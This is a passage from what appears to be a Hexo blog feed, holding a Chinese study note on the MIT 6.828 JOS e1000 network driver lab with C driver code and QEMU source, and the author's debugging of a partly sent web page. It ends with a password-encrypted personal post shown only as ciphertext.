class="line"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">tdh</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">tdt</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tds_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NTRANS_DESC;++i)</span><br><span class="line">    {</span><br><span class="line">        tds[i].addr = PADDR(tdbufs[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAL) = PADDR(tds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDLEN) = TDLEN;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TCTL) = E1000_TCTL_EN|</span><br><span class="line">                                    E1000_TCTL_PSP|</span><br><span class="line">                                (E1000_TCTL_COLD&amp;(<span class="number">0x40</span>&lt;&lt;E1000_TCTL_COLD_SHIFT));</span><br><span class="line">                                </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TIPG) = <span class="number">10</span> | (<span class="number">8</span> &lt;&lt; <span class="number">10</span>) | (<span class="number">12</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(nbytes&gt;DESC_BUF_SZ)</span><br><span class="line">        panic(<span class="string">"tx_pkt: invalid packet size\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((tds[tdt()].cmd&amp;E1000_TXD_CMD_RS))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(!(tds[tdt()].status&amp;E1000_TXD_STAT_DD))</span><br><span class="line">        {</span><br><span class="line">            cprintf(<span class="string">"tx_pkt: the transmit queue is full,please retry\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> -E_TDQ_FULL;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">memcpy</span>(tdbufs[tdt()],buf,nbytes);</span><br><span class="line">    tds[tdt()].length = (<span class="type">uint16_t</span>)nbytes;</span><br><span class="line">    tds[tdt()].cmd |= (E1000_TXD_CMD_RS|E1000_TXD_CMD_EOP);</span><br><span class="line">    tds[tdt()].status &amp;= (~E1000_TXD_STAT_DD);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = (tdt()+<span class="number">1</span>)%NTRANS_DESC;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="Part-B-Receiving-packets-and-the-web-server"><a href="#Part-B-Receiving-packets-and-the-web-server" class="headerlink" title="Part B: Receiving packets and the web server"></a>Part B: Receiving packets and the web server</h3><p>和Transmit packets类似,查手册写就行了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rx_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NRECV_DESC;++i)</span><br><span class="line">    {</span><br><span class="line">        rds[i].addr = PADDR(rdbufs[i]);</span><br><span class="line">        rds[i].status &amp;= ~E1000_RXD_STAT_DD;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RAL) = MAC_IPL;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RAH) = MAC_IPH|E1000_RAH_AV;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">128</span>;++i)</span><br><span class="line">        ((<span class="type">uint32_t</span>*)(e1000+E1000_MTA))[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDBAL) = PADDR(rds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDBAH) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDLEN) = NRECV_DESC*DESC_BUF_SZ;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDT) = NRECV_DESC<span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RCTL) = (E1000_RCTL_EN | E1000_RCTL_SECRC | E1000_RCTL_BAM | <span class="number">0</span>&lt;&lt;RCTL_BSIZE_SHIFT) &amp; (~E1000_RCTL_LPE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> max_bytes)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> next = (rdt()+<span class="number">1</span>)%NRECV_DESC;</span><br><span class="line">    <span class="keyword">if</span>((rds[next].status&amp;E1000_RXD_STAT_DD)==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -E_RDQ_EMPTY;</span><br><span class="line">    <span class="type">uint16_t</span> lenth = rds[next].length;</span><br><span class="line">    <span class="keyword">if</span>(lenth&gt;max_bytes)</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,rdbufs[next],lenth);</span><br><span class="line">    rds[next].status &amp;= (~E1000_RXD_STAT_DD);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDT) = next;</span><br><span class="line">    <span class="keyword">return</span> lenth;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>其他代码详见github.<br>通过所有测试.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141920905.png"></p><p>现在启动httpd server,在浏览器中访问html页面(正好桌面上有这个html及css等文件,就拿来实验了,这是我曾经的一次作业,你可以通过这个页面猜到,我最终没有通过考试),可以看到这样的界面.<br>你可以看到有张只有一小半的BUPT校徽,<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141954122.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141744741.png"></p><p>我尝试输出字节数的方式来探究其只有一小半的原因.发现确实未发送完全.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141751103.png"></p><p>我启动e1000的调试功能,多次实验发现在第125次发送时稳定触发,与TX描述符个数无关,更奇怪的时,触发之后125,126,127还能够继续传输,并且再次触发.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311142017469.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311142036889.png"></p><p>我在课程提供的qemu的源码中找到了这一报错,它意味着e1000正在发送的描述符的buffer_addr为空,但我找不出原因,我的初始化工作和其他工作看起来没有问题,至少不太可能出现buffer_addr为空的问题.我不确定是否是课程提供的qemu存在的问题,该问题会在以后的开发中再来解决,毕竟计算机网络方面的知识我还所知甚少,近期的开发会先从JOS一些实现的优化开始.</p><p>如果您知道问题出在哪里,请联系我,感激不尽.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc.buffer_addr) {</span><br><span class="line">    <span class="keyword">if</span> (desc_offset &lt; size) {</span><br><span class="line">        <span class="type">size_t</span> iov_copy;</span><br><span class="line">        hwaddr ba = le64_to_cpu(desc.buffer_addr);</span><br><span class="line">        <span class="type">size_t</span> copy_size = size - desc_offset;</span><br><span class="line">        <span class="keyword">if</span> (copy_size &gt; s-&gt;rxbuf_size) {</span><br><span class="line">            copy_size = s-&gt;rxbuf_size;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">do</span> {</span><br><span class="line">            iov_copy = MIN(copy_size, iov-&gt;iov_len - iov_ofs);</span><br><span class="line">            pci_dma_write(d, ba, iov-&gt;iov_base + iov_ofs, iov_copy);</span><br><span class="line">            copy_size -= iov_copy;</span><br><span class="line">            ba += iov_copy;</span><br><span class="line">            iov_ofs += iov_copy;</span><br><span class="line">            <span class="keyword">if</span> (iov_ofs == iov-&gt;iov_len) {</span><br><span class="line">                iov++;</span><br><span class="line">                iov_ofs = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">while</span> (copy_size);</span><br><span class="line">    }</span><br><span class="line">    desc_offset += desc_size;</span><br><span class="line">    desc.length = cpu_to_le16(desc_size);</span><br><span class="line">    <span class="keyword">if</span> (desc_offset &gt;= total_size) {</span><br><span class="line">        desc.status |= E1000_RXD_STAT_EOP | E1000_RXD_STAT_IXSM;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* Guest zeroing out status is not a hardware requirement.</span></span><br><span class="line"><span class="comment">           Clear EOP in case guest didn't do it. */</span></span><br><span class="line">        desc.status &amp;= ~E1000_RXD_STAT_EOP;</span><br><span class="line">    }</span><br><span class="line">} <span class="keyword">else</span> { <span class="comment">// as per intel docs; skip descriptors with null buf addr</span></span><br><span class="line">    DBGOUT(RX, <span class="string">"Null RX descriptor!!\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如果有一天</title>
      <link href="/2023/Life/"/>
      <url>/2023/Life/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c2fd05c331e6143c540661a66868460499c16e11e47dd9a7d288d1c87321ba18">b11681a661dd0610208792ae45d3d98af6726b730b6bfbefc8e1d90864c429facc81a7ab4ae973096152d2a794ead2afc8fc15baf6f8c5151928c198cc68eef4b81309a508e2d7e7d8f19675263c48edc7be2ca789995afbf8247dca5601cfcd476353eecf485cefbce4d1730d73e62d52680eae68ef0b619a24a3c6f173d2b7fdb0f368503d9808aa80caf800a07558066eb0be0986ef8bc770fd03710e4cf2442596ef1372116293a757c8ff602c8a230ac272eedac97440f682fb87ef899ec9176c75964ce1c656273609a60319b7c3919837d4225516c1d86403200a80ea2831bd4c9c7c23ddc1cf66649681d7fea5f547ca04ceae6146193e6dda4907c8eb7f17512f6f4c6f69f6e54d1a3be3ca879d38c26429d599071e1e80bb0c517503cef0df9021286756b07e0bda2661554ac48588b5e1f6fae73ac348eaba00165fae3caa1ccc4ae6e1a04612a9a2a68c77877d15f4f42f73a445334658d5fa8b098442d621079a07392fc19f688921cf213d84cf5f65d6b5950b0a4fe1543a240d358da39ed9cab03549c97b66b344883de31dd92e3e79a998e45f121eeff08c071649b952835d1ffed7965a8403ec10375fd120765d9d934530aeb0da4d9963c95d5be3a67f4abe50c80bdfefdf8396dd08574943ad0c5a6211d2dc43fe7a7347807ae5d287b04c8ed719657c3aafbe6de30651b799fe7f1265bede5e874dd77a2df0cd38ef967972724e48063d926fd29bb34b81a9adc83e2244de1fb075d9e90bf27959b9fd5fa7b204160e403c59e26b0722e121b51421c5fcee4740b41fcc3250dc579adf2c1506ee84a7442d2f16e0fb5ad042bb66e633035c9dea1906a8f2c3f361d12cb713a32917af40d2bac0c5fce94ab738270214507928e587bbaa03b49ef225679938f8ae7a28158153494bef4fda26afd44d759d8a3c2ebaae7adcdd32f8b50cf63be4eed300df1fbc9b828fd73e0fbb05cf7f35ec917e291a44d25d3a474b82e73b1ec2b4318856cb54d379e07d7e502b7d57ef9e52220c6d1b8d05e9a2c8aeed6bdd77a102631b6908a5361a995b0ee8c8aeaf815f6a2f2beb1ef734223821d7ccf9c75bb66aa2524ec3b94d41ee18a0ecd60cba3d46efac2d157d54fc40080b553aece3b4ab421b1a594425b2676b317c51670fb16b322a6bf7b30ec876304174cdcf6b4ef3da76c6c74c57ef672ef055e2906f9e9496a615bb4b1ac7196e9c2fd9d7a30bd70d382e297e307d9e4cd52534ce628e60d014bc884585d79793bcf26a404da30fefeca393d7b70e58faaa83c9ecd85073270ae71d84dbc0b549936cf49c976ce4202e5f8ba38c266dcf78d14c26483fc85ad54473a2390c791133caf5f997daea8449a93803389039fefdbb66e8bd55826d5156dbe93241899febb0287cfc3ccb7f735a92014b795ed1e84f8e7f6281f34d041b479503ff729d9e5428a1335fb10f95120ac9d256067e29103caa519e4724a0e4d86ab6d77b2acdb4c6d43a5d8bb8f45a86fad36f258804a7b38bd970060ecb623a8cd49b5e4708530662740aa2ada4f1e984da4bc6348e6a69b9c6835f316241e708c45e7183affdd16b1c766d7c19179b086d1c4f49f532a0338681b18ac05ef4919dd42c4844b29f856288c0307243576b958e295e4dda1b45fdedd2ceca512572eb6662f2ad2894cae3890e80af9cf324f0f6eee06abb6777533b4f46fd0fc5d5e9588be973b4477267046b9fb39b756fb9a803251f51f903ad5123cf225b466813e64c41a21d035c1eb2c0f1881e677c0118b65021e8ec776ddcf8cc3771aa85cfdafd6d8f272256477c557fac0d4dec90f981d3cbe399964af9625c88fd48f7e310f80d0a26c7623e2aa9448cda6fe5fdf920a759a836fdc5cf15e94e9cc9905ad9a3aa0762c8f65a4e13e0debfc00a3ab29a602b5d97a29130e63ecedf1e8e53b79b9c190fa64468547e2535408538862166a7fb0b1f4b2def70a3d2cf497a6eb044ceb09c89093c6d22178f6f411af90c83cd523cf595ae1bc7a2d0262a219b8baca4401913f3eba30b127d87a9cf1bf3e31152bb5a7387e9d73a25f70b7941570b06966575a4f551babf6edbb482ecf55b66403c2d34aa2c71da7fd8d96f0e6f37717a062ca026f14b44af5973d06eab85b05d5e4621d1f94d0bd6f7dcab09d8c9c5f0cb3abb95d2f57718d2ee59eadf096c65f5cd96e8ea4a3da221064f251367d85db92174feac811195b5c475b94196b515484cb17615f7077c9b72c58c2c8bb50fbb5e70a0c7ebf245a537a1f6a3d5ae7b16a3ca4758067e129c617bc335a70d7d3f85b19408a041568c2db50fdde2359aaf4ddde66b51784ab70b39406fd7bf45d9f7d1209c2c1865ce992d960eac7dcdd1e38e8bfe1dcfd0d6cad68299d340d8192466216117bb48a5ab2b65b8f207e1f876cd882c87df2a41542e4b2200437806d830ffcbeed30b594dd65a92d5e95b6fa762c5ef480adae22184464c5b7c2a3b73ec9a6e21b50a15f03535bff72f072e977fa98e73e6c85655410bc1e089c19edf63f7cb4df7b80f8308663a481f282706fdc2a1953235175d42519af7af487e006319f2835a91e64262fad8d4060bd8a114384502736965d843da5c7f4fb4f3d8806d24919ff3d58bf191bdaf7dff04a67a350fb27bdcf3c043b6057c5efb072763b3bf585d543d6c49410be7173d23c5f8e8db90ded219486d97cca20a6d71a32a4e305a9bce83fad2ab970965f1560b2a82a5f1265e107d7d11429854b869e4b3a31a3571b2c656e894efa0ba26ff74498293f3bf2b9536a29d6b40957b8d8977a007c34f382c42ccd67916f8e1093297df1f40c6038ef05da5a871f07c4092a04e0539c1481fee77ea9ec96284bbb45346e460fc068cc698ba07153145733a420058bc9bb1641b0fb78e1d5acb1b8859d8b744a72d6f24a8570b08ba084e4d3f2c0a4f615af177a8d3cae772ac5487be7b67dada8e2ec50a6c2bd1809834dcd387dd06e9ec2a47d7c82b378259032643014e35625485236e8db4d246c4f796283c39891350641f87390f45d07b23c0862c7fd69ad7c6b0b72730de4595f0479ce7e0f3189324f766b457ff99d837f7fa12c3a474b5308bd258ad215484d6fded7662f5ca7028c28dd602061f22b4b9782f0e76575ddc68b80cd02986a5b68c74d066dcf5d6474acab603ab9f154043bf2f8b299379c57a9eaf7dd508ff8457589bb845fcb54aeee36632c218e1e52670dabb85eb5c8cc7434887896fea7d43e30080fe15619c2b367fe83fbb07d19632a7b3a7701347fd311d59ff86f76ac957294255ce30f0aa600a5eb55fdc5310a8604ba017c7a1da81e82e8d226cce716ad4142f876c44684c8fb435cdc493a091af854f2d2733ac84022988acb59d0eac9d084c6c0810f16638ce542e15a729da056df6cac135cfe78d2d7bba5b01641c34e1f15794950e9d3928f7a50ff8adc936a1d1e8ff7562c093ce450ef0a096b3c0b80eaeb9707db001c51ad1a441cfcaa5328fcb1a9ab5c407107de2d034c22dd62bac5fb7be043f77aa25358206dc11f204033af67e23b02c0bdb87bb4905b792bd61d4a053a2c9625bfff20fbb73ce42ca18005a9cd46436421033b6205e65d81ef4c682df361f3aeebc7b33f6550d375f635e73db2b0dd444bd9e44d7ee6232c1914f1b358db8caeccdf5098ba0764329d911df4bbf6b99a84bbd4985452220bdaceb38df3c5d76636310d613e1b9d93b4df8938f8adcae9659cd02b25503d8bab692ee0667817781a1644111c9b5e0a0348a6852c4169c3e2cd18c973ee87a075879d435ee583c65c8a52bb618e5e92f55e7f7c3a39276a5927449291020b2732673c7dd86c3c669c0a38853c210d837f5ca2fbe95723b8ec9a1ecbac49778a7e5732c80b1d67965f0a1d05caf3c5554b79e5dd61504a7652df6e50842a7ade213a23c971b0852c6011fce4c890ee469109f7bfe6e3210e812cac0e55287d1576c735fbcba9e85d9441e17cfe6b28559eb3667157bede809d68f063ccb60aa2884ef485ff73602f46fdc7ccc7aa771c5aa43e25a50a6bc8302b253f3180ca2db3212c130edef6706845c04453b393235cafd28a0562ead72bfd79eab007e9d11489616dfebd0823bd820ca33ecae7f7e85e41d53edf52cfcddeb86f581cdaa1891bf5c4d4408819c63149d89fafad3209e645e61ad420bd44a42aab68a57f2bae4f32f4a74356364f181ee339f76285cc02e4eb0899210a48d795cfb0d69ed3ec5929ddd973a1098a3ee51e3cf1c129dfe070d7e56cfee14795b49af4c2755498b13c6c3208fb51958c65eb1d1a9cc8df4dd293454316d5e147be24d87ba4f57e6a9d717d9f9ca894614d574628846dc79a37c85c86901346ae3489e475edfdf502e40070ca612ddd0c0f413da5e8adaec646076594abbc4e1aa34dd559b8f19dcc0d1be641861e5f628246d332ffd7d2633e23e88776175bd66fcc7237033950044878f8846a9d0cb7f56d89d989638a61d72f566c41aaa2d63b2ac98924b08f042dcf2dc127e32ac46c2d55243dd9a89d49410d5f4cefff4fdafc6fe7dfa7d4c94f066de6296d15ec16888eab9283e52da1ece0b7d74edabb5d8dc2054d72ddf928be2c619f9f35ef515f8ec7c052d65a2dac29c02261e1e30d2133bf35cedad9218709b878cacec7e15d8f92b4fe977387e71310d4cbb8199d889dd7d513fe6b7f71a6af62054da0804a1c4a0f3e6a789dba9328679dd5f8634daa286e4893072c3581032eaa68bae67065fc9e7d5e95024a1abd21c649a710dcb13907e5e279cc5a534b5299c42b358d299b01c27d3adadb2e56b21a91ad27b0dd7b10361157935c22c48f59f7cb11251b4e08a0e62fa5f49582b51c4974ab1344b28ee3cd400a16e7eb589adf70caeda2ac8a4120d91256e4c0e40775e4de06d200832426e59269259d8d91d037c1d1dec378103be45f750ea31a68cf0aa76ee3c6c98fef72b7e909e78484aed58dddeca25ab3984f4c01706e71628bbe24a61ee62ba32ddc2f15a3bdeb4d8fe11338783d15566df7f71576b6a8fa2be1f1422bd4c8a1254df6b6246038f5da15f72f8b53c345c6c04fa275b45853f1c36f35455f2ab66a8c05aed6a117f43a703ce486e6c128013404e23a8f37e97ae1abe74c11ab9f62b595307242f1ab4db9f81e7ced1277e488949cbae4704eff3503ad85af386128cb16778e66261a25f34d351ad047efa29d8cb82459d12fa849f9792d6ba245863309a9346ce3ba8d6e8d5c20d51dd46352cd04a8f32a5477d2bddeefbee9fc3d06a3a5bb2aa870ba64b13ea70e430296b5c372545517893a79a48e5f705d5a4384edfabf4485109b60df261703e379248e20356d2b9d65ebf16215e68646f70e88140b9b89fcc1b666586aeae8dce6bf2ddf50448cb711d117ded1a425d90f4dcb364d8281632aa25b8d6d55c94fc9d697c06da0bf4b0f47be463feebd69e202878a83ae58801383e231fd420f93856308c06dfcee94175ac9c186cd29db2ca4507f5d995641b51fe8d0bbfa4b2135c94bd7f375b4516c2aa1ec87701fc12e42477fa709516a62e59e11063bd7277137b82e56531c86f140dd8c482e20c304eb5a2733bb9fb9a03b38bad1830f7ea78692e92a32f0f8b21aba13be82e14d8782e711624eacb476d377e8a412436a2f12fa890e58f506d543a5d7d9d02b2eda01c2da8c3d34db501c8b1135f1d3e781db6dc84d53fc10ac7d0ae26940b812060cd43ef21d500266d42ba335a57a5400c641f1fefc79dfea4940ddafaf050b85ab45baf1be4a6ebe24a4b97abf4528b193187818f3a2a157348af93daae828aeaa007845c141ef7162ee82a9fd06bfb1a7952929dcc4357b8b158d6b7ff46a84f8d24117ec6a463690e4edda8733250c905a5f00e9630832507ed1100f1d851c90b47f70ee11b11f9f6c19efb2f3ce8d973774bdb29cad8ecf36f79914e1952658c232a98470e9a443844d351c37ca08c713059e14476cd80bcc1c10f453ae5cb2356f7fca8a902d99c392ec3b3c5ae0ea881f498f0bc7f6891f6e85280303e8950f4eb7a2f62edeb67f65d0af3cbdb3dd44b9ec4ee3877c534dad41133bc050700796b15a6852be7f88769059fe906c1abb6452b665aa0462f9cafa86e3926c58a019514d59a5834980911833aba273e3d4ce7d15579ed401224c5354525d8ac66e2716b009dd98705af0b1a8de9699f592209766a6f183164302a12b7cddc689bff0f2bb1dd420ac2a6b79b74de6711fad65de8a22450e2a4cfc95fe7cd8059eceb1bbd517805f3875a5b0155ee742c3da10c0eaa3e4e4c24fa8dcf11f273317febd3f5c3ba2f16479cb8d64ccb469e8703fd21133413f856295c157706157b002279c8c8be62253ba53f74ee8529ea321ac3986345998cb6bcc8469b2cc8ae08c355a4ab10aeab371addf48607dd449548aac1792438064c96796a60e5dd7855b6bdfb830c54ca4e090477968d5dc8238c4ee7c5d1f890c17f13912fc14779381d5bc94445358122f4a687cd2566e1bc143c685db94879914537e76ebcfb1cc5a3a0dd3adbdf5cc46b0a3b65b7e557ad8d1dc077e10ad36fa8dda3967c4144c010455b351039d332f9019ef84063cd60bee2348f114cc479ae621d86b0d4f10cabeb3f5d092af9d62f2110ab8020f227132bc448195cab1e82578b7e14cf41f32e4e2322d5500f5143c4e64c80414b658409676f3febeb0b0b456d79cf3a68858d12a930bdd5c142e3f523b6b4ac1194807d04e0c055d5870faae6bf7e790765065eaf74841d8d33460b3be682529a89d4a1e20a4e5c2969a240c3b34ce7e036dc5d9e4a768f1f4eb3f99728e18d42ebfaa2a975650f2ced60ddcac7138cacb1da20cc276fd452f9e6538c101545fec2c6a0f9a1439676de5adaceb159c160b25543a267722e7b756aa2d7498278ea274ae8131c27d662606d8f3c8154df55ef9568710e789495719969fb2f225b9a4da1265458be48f125b4f653d55eb50dd4d514fb530089d6848c7f433cb5cd4f56db209441bdec464dfae9e4b9acfe11bc8caa52b3f0b1398e7e481c5bcc71ee732c248a79c15d5a8963d26fb1e4d7388d0d350817a7b6c3e88adfc45abbf744b8dfe1896da919ee0fa0051485f192aa4bfd73fcad20bef94de3498ca9b35a1800312737ea13c384f37b65aa1867810e810b9387406e9cf5f6c45d468bf546cbbe767c047ed2602bdec496700e037c1efe70ce7fd72852c19a1d7f652832306d9d1b3257fac6f48c354efc01ff6cfe7ae22a1406707a82cedcd0892cc2c7550148e04a283fffa2ac2190d537f0e8fdeaa87bf144a431e825ed3f691a1ae629836997c621e078b8499741ac8c4a85ee373f4b21890f13a6d7f76706e66589c438a8a9405127e6272d88c7ace096b76f25c58ab9c4b3c9692d1b253ec199607edcb3e04b36f84a9bcc86f26bf4fad588f60277de96aaf5f94cbc3f37b84f6e88fc5f6bd3e72fd3b1453bd7fd78c9734781426509d7e6f46f1a1c92fe06df1dae4a737bc41bfd68b991b8e93c85bd931b389f21fccdf857641bdf735fe3bf9a388d0f64a64148097455214c1ea6a0caff69ad2f24307de4360d07d3007b6bbdd1d6dd409412b35c7fa0c8299073756c3a04299b0c728347587caf6b2fb84b9bc55e550db952a426d5bc3099bdae508009002ad26b6347276b72c10b68ac108f76bcd17869d0d3f4cbb55550907b8888674075b4672c89617b30ef618d005ed4e988af3ace5754999fb260b78bb5e2a04dfd9715a53759664bad0fbab512724af2ed8e4129f59ff7e82da5d21263cc564dc8ab637df07d5c4c680fff148674413f81181a03358358f43a24e838eeea42d9e183172e462b0f87218ac0d4eb2c23a90cee7d7a146f3876dbc8272db706ac59972796d2479c15b5227940669cda66a98d739f45a0aa3cb97bfb243897368e056cc89fd3a4caf71eba4697e397f3e0cc133e9f248f9258d982d857f2153cfaf43f8194b78885780369754b2df826eb5f250cd78a3b56f45ee953e3ce22feeb18615b38eb895ae848518e3b7f24ab4ca49e2303fc524ca1b4d7454a3b25942b1c10c40ae651a259b0489b743edbb55faa752ba1f85d6c832df19a780d40e616e974f78b5c0b8d502306406ee373f13957dcc1d8c79b888ffa5f354f8947fa20930c80c7d93d1a579471efd147ad009019206047646f6cda9daded3ee34c52efc76778242c1db8b9d6ca93bf65a5bf500e6a4acf1772b07cc9401f9fde72ad56c9c57d7b49e9473dd9edca7d2003ddebbdc8f11c2c316f8f7c77e46a94a57c2fdc23004fe457c4c4b4fd312437ec6f07d9a9b5f067f82ac4ed3487c1156602d6577f75a7b131ed8a523b8ad2d0c21823e5fa9302574f576e1c89ecf2486b52aac0d813d3ee155f688b876975b12aadc1ba73a203fc950c3cf5f914b725927790fdd7029e52fb97b176be9abdb41f86fe1b1f1bc7071300199d90f64e7bc36bf7bf6ea4669d5523fb08fb520df49da43c64a6dc6c5d028975aa4c94705e4977985c5e1f13243e5effd72bc77cba532bc2c9a8564748bc470519132e9af3ae62677b16e1feebda24e8e0ddee26e098280103e1e66b82933f7e09e53c6eda88eef6f5594abe691d28098a84157b6a6ddad00023e1eda248f1fbb5cb772bb16b25e727b3b66cb2b29c8695bedf3707deaf917955c78569ede7ca8635980fb9ae7d3918600e8bb032ece0b060dc85e0afbc726baf4eb6a7ff2fddaf8893483a77c3e37537ef21564568f6d7562dc82d1fb9dee2191f8057246251db4e48a9e98e60648f7f614f19e73fb723841222401c13c207d88623993ca8dee3278b3630de72699c1394cf0e17270a54658773f7c788f3eb528a08dbea23c72e1becb59af70c3fb0345a40e6c5e6cf5ca49296be165a3f629f2bdd95c6c11b0f4dd4bd982d9d3548bea78768d9aafb06f439dd716f0c0c005cb0e3b48684df9f1e3f0215e81e74b28911e53dea8dfdc5434a685c6248573b9c919b8547e33fd751d41ae82f47107fad3d62f254ef7785f62ab3ab8b83ba4a9fd392c6690da20e3df8da01b91c6b0346d1a4d5cd5853d4fac0e9b6a6ddc56b472046bf8590d55ccecd9317ace53500bfac8e80a9377e44694ce5f1da5e4058757c7a58ad427d2c7fedd3fd07b96651df85bffad04d3acf08010ca4047b3be637c0f08868409d8f7730a6069b1c2ae0c173692eca50cb84e8934f382311941ea07d0722bd1120b3bb76057727e3904